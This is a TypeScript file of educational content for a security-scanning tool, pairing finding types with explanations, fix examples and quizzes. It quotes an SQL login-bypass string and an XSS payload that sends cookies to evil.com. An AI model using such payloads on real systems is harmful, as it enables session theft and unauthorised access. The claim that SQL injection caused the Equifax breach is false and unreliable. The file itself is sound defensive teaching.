/**
 * Learning Mode Content
 *
 * Educational content for findings - helps developers learn
 * while they fix issues.
 */

import type { LearningContent } from '@/lib/vibe-score/types';

/**
 * Learning content database
 * Key = finding type/rule ID pattern
 */
export const LEARNING_CONTENT: Record<string, LearningContent> = {
  // ═══════════════════════════════════════════════════════════════
  // SECURITY - Secrets
  // ═══════════════════════════════════════════════════════════════
  'exposed-secret': {
    findingType: 'exposed-secret',
    whyItMatters: 'Exposed secrets like API keys, passwords, and tokens give attackers direct access to your systems and data. Once committed to git, secrets live forever in history - even if you delete them later.',
    realWorldExample: 'In 2019, a developer accidentally committed AWS credentials to a public repo. Within minutes, attackers spun up crypto mining instances costing $6,000 before AWS caught it.',
    howAttackersExploit: 'Attackers use automated tools like TruffleHog and Gitleaks to scan GitHub for secrets 24/7. When found, they can immediately use credentials to access cloud services, databases, or APIs.',
    fixPattern: {
      description: 'Remove the secret and rotate it immediately',
      steps: [
        '1. Remove the secret from code and use environment variables instead',
        '2. CRITICAL: Rotate/regenerate the exposed credential immediately',
        '3. Use git-filter-branch or BFG to remove from git history',
        '4. Add the pattern to .gitignore to prevent future commits',
        '5. Consider using a secrets manager (AWS Secrets Manager, HashiCorp Vault)',
      ],
      beforeCode: `const apiKey = "sk_live_abc123xyz";
fetch(url, { headers: { Authorization: apiKey } });`,
      afterCode: `const apiKey = process.env.API_KEY;
if (!apiKey) throw new Error("API_KEY not configured");
fetch(url, { headers: { Authorization: apiKey } });`,
    },
    quiz: {
      question: 'After removing a secret from your code, what else must you do?',
      options: [
        'Nothing, the secret is safe now',
        'Rotate the secret and remove from git history',
        'Just add it to .gitignore',
        'Email your team about it',
      ],
      correctIndex: 1,
      explanation: 'Removing a secret from current code isn\'t enough - it still exists in git history and may have been compromised. Always rotate the credential.',
    },
    resources: [
      { title: 'GitHub - Removing sensitive data', url: 'https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository', type: 'docs' },
      { title: 'OWASP Secrets Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html', type: 'docs' },
    ],
  },

  // ═══════════════════════════════════════════════════════════════
  // SECURITY - SQL Injection
  // ═══════════════════════════════════════════════════════════════
  'sql-injection': {
    findingType: 'sql-injection',
    whyItMatters: 'SQL injection lets attackers read, modify, or delete your entire database. It\'s been the #1 web vulnerability for over a decade and is trivially easy to exploit.',
    realWorldExample: 'The 2017 Equifax breach exposed 147 million people\'s personal data. Root cause? An unpatched SQL injection vulnerability.',
    howAttackersExploit: 'Attackers enter malicious SQL in form fields. Example: entering `\' OR 1=1 --` as a username can bypass login checks. More advanced attacks extract entire databases.',
    fixPattern: {
      description: 'Use parameterized queries or an ORM - never concatenate user input into SQL',
      steps: [
        '1. Replace string concatenation with parameterized queries',
        '2. Use your framework\'s ORM/query builder when possible',
        '3. Validate and sanitize input as defense in depth',
        '4. Apply principle of least privilege to database users',
      ],
      beforeCode: `// VULNERABLE - string concatenation
const query = "SELECT * FROM users WHERE id = " + userId;
db.query(query);`,
      afterCode: `// SAFE - parameterized query
const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId]);

// Or with an ORM
const user = await User.findById(userId);`,
    },
    quiz: {
      question: 'Which approach prevents SQL injection?',
      options: [
        'Escaping quotes in user input',
        'Using parameterized/prepared statements',
        'Limiting input length',
        'Using HTTPS',
      ],
      correctIndex: 1,
      explanation: 'Parameterized statements separate SQL code from data, making injection impossible. Other measures help but don\'t fully prevent it.',
    },
    resources: [
      { title: 'OWASP SQL Injection Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html', type: 'docs' },
      { title: 'Bobby Tables - SQL Injection Examples', url: 'https://bobby-tables.com/', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════════
  // SECURITY - XSS
  // ═══════════════════════════════════════════════════════════════
  'xss': {
    findingType: 'xss',
    whyItMatters: 'Cross-Site Scripting (XSS) lets attackers run malicious JavaScript in your users\' browsers. They can steal session cookies, redirect users to phishing sites, or deface your app.',
    realWorldExample: 'A persistent XSS in Tweetdeck (2014) allowed a worm that automatically retweeted itself to 80,000+ accounts in minutes.',
    howAttackersExploit: 'Attacker submits `<script>document.location=\'https://evil.com/steal?\'+document.cookie</script>` in a comment field. When other users view it, their cookies are sent to the attacker.',
    fixPattern: {
      description: 'Always encode output and use framework protections',
      steps: [
        '1. Use your framework\'s built-in encoding (React, Vue, Angular do this by default)',
        '2. Never use dangerouslySetInnerHTML or v-html with user content',
        '3. Set Content-Security-Policy headers to restrict script sources',
        '4. Use httpOnly cookies for sessions so JS can\'t access them',
      ],
      beforeCode: `// VULNERABLE - inserting raw HTML
element.innerHTML = userComment;

// React VULNERABLE
<div dangerouslySetInnerHTML={{__html: userContent}} />`,
      afterCode: `// SAFE - use textContent or framework defaults
element.textContent = userComment;

// React SAFE - default behavior escapes HTML
<div>{userContent}</div>

// If you must render HTML, sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userContent)}} />`,
    },
    quiz: {
      question: 'React automatically prevents XSS when you:',
      options: [
        'Use dangerouslySetInnerHTML',
        'Use curly braces {variable} in JSX',
        'Add onClick handlers',
        'Import React',
      ],
      correctIndex: 1,
      explanation: 'React escapes all values in JSX curly braces before rendering, preventing XSS. dangerouslySetInnerHTML bypasses this protection.',
    },
    resources: [
      { title: 'OWASP XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html', type: 'docs' },
    ],
  },

  // ═══════════════════════════════════════════════════════════════
  // ACCESSIBILITY
  // ═══════════════════════════════════════════════════════════════
  'missing-alt-text': {
    findingType: 'missing-alt-text',
    whyItMatters: 'Screen reader users can\'t see images - they rely on alt text to understand content. Missing alt text makes your site unusable for millions of people and may violate accessibility laws (ADA, WCAG).',
    realWorldExample: 'Domino\'s Pizza was sued in 2019 for an inaccessible website. The Supreme Court declined to hear their appeal, establishing that websites must be accessible.',
    fixPattern: {
      description: 'Add meaningful alt text that describes the image\'s purpose',
      steps: [
        '1. Describe what the image conveys, not just what it shows',
        '2. Keep it concise (usually under 125 characters)',
        '3. Don\'t start with "Image of" or "Picture of" - screen readers already announce it\'s an image',
        '4. For decorative images, use alt="" (empty) to skip them',
      ],
      beforeCode: `<img src="team-photo.jpg">
<img src="chart.png">
<img src="decorative-border.png">`,
      afterCode: `<img src="team-photo.jpg" alt="Our engineering team at the 2024 hackathon">
<img src="chart.png" alt="Sales increased 40% from Q1 to Q2 2024">
<img src="decorative-border.png" alt="">  <!-- Decorative, skip it -->`,
    },
    quiz: {
      question: 'For a decorative image that adds no information, you should:',
      options: [
        'Use alt="decorative"',
        'Use alt="image"',
        'Use alt="" (empty)',
        'Remove the alt attribute',
      ],
      correctIndex: 2,
      explanation: 'Empty alt="" tells screen readers to skip the image entirely. Removing alt is bad - screen readers will read the filename instead.',
    },
    resources: [
      { title: 'WebAIM - Alternative Text', url: 'https://webaim.org/techniques/alttext/', type: 'docs' },
      { title: 'W3C Alt Text Decision Tree', url: 'https://www.w3.org/WAI/tutorials/images/decision-tree/', type: 'docs' },
    ],
  },

  'missing-form-label': {
    findingType: 'missing-form-label',
    whyItMatters: 'Form inputs without labels are impossible to understand for screen reader users. They also hurt usability for everyone - clicking a label focuses its input.',
    realWorldExample: 'A major bank\'s inaccessible login form led to a class action lawsuit, resulting in a $12 million settlement.',
    fixPattern: {
      description: 'Associate every input with a visible label using for/id or wrapping',
      steps: [
        '1. Use <label for="inputId"> with matching id on the input',
        '2. Or wrap the input inside the label element',
        '3. Placeholder text is NOT a replacement for labels',
        '4. For icons/buttons, use aria-label as a last resort',
      ],
      beforeCode: `<input type="email" placeholder="Email">
<input type="password" placeholder="Password">`,
      afterCode: `<label for="email">Email</label>
<input type="email" id="email" placeholder="you@example.com">

<label for="password">Password</label>
<input type="password" id="password">`,
    },
    resources: [
      { title: 'WebAIM - Form Labels', url: 'https://webaim.org/techniques/forms/controls', type: 'docs' },
    ],
  },

  // ═══════════════════════════════════════════════════════════════
  // QUALITY - Code Duplication
  // ═══════════════════════════════════════════════════════════════
  'code-duplication': {
    findingType: 'code-duplication',
    whyItMatters: 'Duplicated code means bugs get fixed in one place but not others. It also increases maintenance burden - every change needs to happen multiple times.',
    realWorldExample: 'A startup had the same authentication check copy-pasted in 47 places. When a vulnerability was found, they missed patching 3 instances, leading to a data breach.',
    fixPattern: {
      description: 'Extract duplicated code into reusable functions, components, or modules',
      steps: [
        '1. Identify the common pattern in duplicated code',
        '2. Extract into a well-named function or component',
        '3. Parameterize differences between copies',
        '4. Replace all duplicates with calls to the new abstraction',
        '5. Add tests to the extracted code',
      ],
      beforeCode: `// File A
const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);
if (!user) throw new Error('Not found');
if (user.deleted) throw new Error('User deleted');
return user;

// File B (same code!)
const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);
if (!user) throw new Error('Not found');
if (user.deleted) throw new Error('User deleted');
return user;`,
      afterCode: `// utils/user.ts
export async function getActiveUser(id: string) {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);
  if (!user) throw new Error('Not found');
  if (user.deleted) throw new Error('User deleted');
  return user;
}

// File A & B
import { getActiveUser } from '@/utils/user';
const user = await getActiveUser(id);`,
    },
    resources: [
      { title: 'Refactoring Guru - DRY Principle', url: 'https://refactoring.guru/smells/duplicate-code', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════════
  // DEPENDENCIES
  // ═══════════════════════════════════════════════════════════════
  'vulnerable-dependency': {
    findingType: 'vulnerable-dependency',
    whyItMatters: 'Known vulnerabilities in dependencies are the easiest attack vector - exploits are often public. Attackers scan for outdated packages and use ready-made exploits.',
    realWorldExample: 'The Log4Shell vulnerability (2021) in Log4j affected millions of servers. Companies scrambled for weeks to patch it. Exploits started within hours of disclosure.',
    fixPattern: {
      description: 'Update to a patched version or find an alternative package',
      steps: [
        '1. Check if a patched version exists (usually does)',
        '2. Review the changelog for breaking changes',
        '3. Update the package: npm update <package> or npm install <package>@latest',
        '4. Run tests to verify nothing broke',
        '5. If no patch exists, consider alternatives or mitigations',
      ],
    },
    resources: [
      { title: 'NPM Audit Documentation', url: 'https://docs.npmjs.com/cli/v10/commands/npm-audit', type: 'docs' },
      { title: 'Snyk Vulnerability Database', url: 'https://snyk.io/vuln/', type: 'article' },
    ],
  },
};

/**
 * Get learning content for a finding
 */
export function getLearningContent(
  finding: { tool: string; title: string; rule?: string }
): LearningContent | null {
  // Try exact rule match first
  if (finding.rule && LEARNING_CONTENT[finding.rule]) {
    return LEARNING_CONTENT[finding.rule];
  }

  // Try matching by keywords in title
  const titleLower = finding.title.toLowerCase();

  if (titleLower.includes('secret') || titleLower.includes('credential') || titleLower.includes('api key')) {
    return LEARNING_CONTENT['exposed-secret'];
  }

  if (titleLower.includes('sql injection') || titleLower.includes('sqli')) {
    return LEARNING_CONTENT['sql-injection'];
  }

  if (titleLower.includes('xss') || titleLower.includes('cross-site scripting')) {
    return LEARNING_CONTENT['xss'];
  }

  if (titleLower.includes('alt text') || titleLower.includes('alt attribute')) {
    return LEARNING_CONTENT['missing-alt-text'];
  }

  if (titleLower.includes('label') && titleLower.includes('form')) {
    return LEARNING_CONTENT['missing-form-label'];
  }

  if (titleLower.includes('duplicat')) {
    return LEARNING_CONTENT['code-duplication'];
  }

  if (titleLower.includes('vulnerab') && (titleLower.includes('depend') || titleLower.includes('package'))) {
    return LEARNING_CONTENT['vulnerable-dependency'];
  }

  return null;
}

/**
 * Track quiz completions for gamification
 */
export interface QuizAttempt {
  findingType: string;
  correct: boolean;
  attemptedAt: Date;
}

export function calculateLearningProgress(attempts: QuizAttempt[]): {
  totalAttempted: number;
  correctAnswers: number;
  accuracy: number;
  streak: number;
} {
  const totalAttempted = attempts.length;
  const correctAnswers = attempts.filter(a => a.correct).length;
  const accuracy = totalAttempted > 0 ? Math.round((correctAnswers / totalAttempted) * 100) : 0;

  // Calculate current streak
  let streak = 0;
  for (let i = attempts.length - 1; i >= 0; i--) {
    if (attempts[i].correct) {
      streak++;
    } else {
      break;
    }
  }

  return { totalAttempted, correctAnswers, accuracy, streak };
}
